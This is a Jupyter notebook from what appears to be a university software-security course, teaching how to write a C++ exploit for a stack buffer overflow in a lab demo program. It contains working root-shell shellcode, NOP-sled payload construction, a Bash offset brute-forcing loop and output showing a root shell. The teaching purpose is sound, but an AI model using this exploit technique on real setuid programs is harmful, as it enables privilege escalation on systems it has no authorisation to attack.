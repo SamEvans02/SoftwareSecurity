{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exploit Code\n",
    "\n",
    "- code/program that delivers payload is called exploit code\n",
    "- helps delivers the shellcode code directly to the vulnerable program\n",
    "    - over network, stdio, program argument, etc.\n",
    "- you can create a exploitcode in Bash, Python, C/C++, etc. to send the payload to the vulnerable target program\n",
    "- this notebook demostrates how to write exploit code in C/C++"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## C++ exploit code\n",
    "\n",
    "- as we've seen that the base address of buffer shifts in memory depending on the size of the program and the argument it takes\n",
    "    - the buffer address we see on GDB is not that same as the program is run outside GDB due to GDB's environment varaibles\n",
    "    - finding the base address of buffer and NOP sled landing target becomes a moving target and thus a challenging one \n",
    "- C/C++ exploits make it easier to guess the buffer address (a.k.a controlled return address) of the NOP sled landing zone\n",
    "- since C/C++ programs make it easier to print the address of any variables, one can create a reference variable on the stack of exploit program\n",
    "    - using the reference variable's address as a point of reference, the target program that's loaded by this program will be on top (lower memory address) with respect to this program\n",
    "    - can try and guess the offset to subtract from the refernce variable's address as the return address that lands somewhere in the NOP sled\n",
    "- let's copy and look at how exploit code can be written in C++"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow_arg_exploit.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <iostream>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "/*\r\n",
      "return address is calculated based-on the exploit code's stack variable address\r\n",
      "however, need to do a guessing work on finding the right offset to find the target\r\n",
      "program's caller's return address relative to the buffer\r\n",
      "\r\n",
      "Steps:\r\n",
      "find the payload size needed to overwrite the return address\r\n",
      "    - buffer's address is automatically calculated\r\n",
      "creat payload: [NOP sled | shellcode | repeated return address]\r\n",
      "launch target program with the payload: system(\"./targetProgram payload\")\r\n",
      "*/\r\n",
      "   \r\n",
      "string shellcode = \r\n",
      "     // root shell; that escalates the priviledge for exploiting setuid program\r\n",
      "     \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\r\n",
      "     \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\r\n",
      "     \"\\xe1\\xcd\\x80\";\r\n",
      "     \r\n",
      "     // regular shell\r\n",
      "     /*\r\n",
      "     \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\r\n",
      "     \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\";\r\n",
      "     */\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    // address of ref_var is used as the point of reference to determine offset\r\n",
      "    size_t ref_var, ret_address, offset;\r\n",
      "    size_t payload_len;\r\n",
      "    char *ptr, *payload;\r\n",
      "\r\n",
      "    string command = \"./stack_overflow_arg.exe \\\"\";\r\n",
      "    \r\n",
      "    if(argc == 2) // set offset\r\n",
      "        offset = atoi(argv[1]);\r\n",
      "    else\r\n",
      "        offset = 100; // FIXME, if offset is determined\r\n",
      "\r\n",
      "    // create payload\r\n",
      "    // | NOP sled | shellcode | repeated return address |\r\n",
      "\r\n",
      "    size_t ret_address_count = 5;\r\n",
      "    payload_len = 144; // the actual offset of caller's return address withrespect to buffer\r\n",
      "    payload = new char[payload_len];\r\n",
      "    ptr = payload;\r\n",
      "\r\n",
      "    size_t NOP_sled_len = payload_len - shellcode.length() - (4*ret_address_count);\r\n",
      "    memset(ptr, 0x90, NOP_sled_len); // build NOP sled\r\n",
      "    ptr += NOP_sled_len;\r\n",
      "\r\n",
      "    // copy shellcode\r\n",
      "    memcpy(ptr, shellcode.c_str(), shellcode.length());\r\n",
      "    ptr += shellcode.length();\r\n",
      "\r\n",
      "    ret_address = (unsigned int) &ref_var - offset; // set return address\r\n",
      "    for(int i=0; i<(ret_address_count*4); i+=4) // fill ptr with return address\r\n",
      "        *((unsigned int *)(ptr+i)) = ret_address;\r\n",
      "    //printf(\"ref_var at %p\\n\", &ref_var);\r\n",
      "    //printf(\"ret add = %p\\n\", ret_address);\r\n",
      "    command += string(payload) + \"\\\"\";\r\n",
      "    // cout << command;\r\n",
      "    system(command.c_str()); // run exploit\r\n",
      "    delete [] payload;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./stack_overflow_arg_exploit.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- just need to find one information with this exploit\n",
    "    - find the payload_len (offset) of the target program's return address using PEDA\n",
    "- the exploit automatically finds the return address based on the exploit program's ref_variable on it's stack and the provided argument as the offset\n",
    "    - however, one has to still guess the offset (the value that needs to be subtracted from the adddress of ref_variable to find the address of NOP sled on the target program's stack\n",
    "- the exploit creates the payload in the form:\n",
    "\n",
    "```\n",
    "| NOP sled | shellcode | repeated return address |\n",
    "```\n",
    "- compile the exploit program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | ./compile.sh stack_overflow_arg_exploit.cpp stack_overflow_arg_exploit.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- prgram uses the default offset of 100, if you're lucky this may work and you don't have to provide guessed offset as an argument\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ ./stack_overflow_arg_exploit.exe \n",
    "buffer is at 0xffffc2c0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��\n",
    "Good bye!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow_arg_exploit_cpp.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/bin/bash\r\n",
      "\r\n",
      "for i in $(seq 100 4 120); do\r\n",
      "    echo Trying offset $i\r\n",
      "    ./stack_overflow_arg_exploit.exe $i\r\n",
      "done\r\n"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_arg_exploit_cpp.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- now run the Bash script that repeatedly runs the exploit program with various offset as an argument\n",
    "- if you don't get a shell withing this offset range, you can widen it to stop at bigger offset, can also cange the step from 4 to 1 to try every number in between\n",
    "- we get the root shell when trying with **offset 104** as shown following\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ bash stack_overflow_arg_exploit_cpp.sh \n",
    "Trying offset 100\n",
    "buffer is at 0xffffc2c0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��\n",
    "Good bye!\n",
    "Trying offset 104\n",
    "buffer is at 0xffffc2b0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S����������������������\n",
    "# whoami\n",
    "root\n",
    "# \n",
    "```\n",
    "\n",
    "- if you exit from the shell, the bash script will try another offset and you may get a shell again depending on the width of the landing **NOP sled** zone \n",
    "\n",
    "```bash\n",
    "# exit\n",
    "Trying offset 108\n",
    "buffer is at 0xffffc2b0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S����������������������\n",
    "# \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Challenge\n",
    "\n",
    "1. Modify the above C++ demo exploit code to get a regular shell (instead of the root shell)\n",
    "    - test to make sure the exploit code works\n",
    "    \n",
    "\n",
    "2. Write exploit code for stack_overflow_stdio.cpp demo program\n",
    "    - exploit gives user shell\n",
    "    - test to make sure the exploit code works\n",
    "    \n",
    "3. Write exploit code for stack_overflow_stdio.cpp demo program\n",
    "    - exploit gives root shell\n",
    "    - test to make sure the exploit code works"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
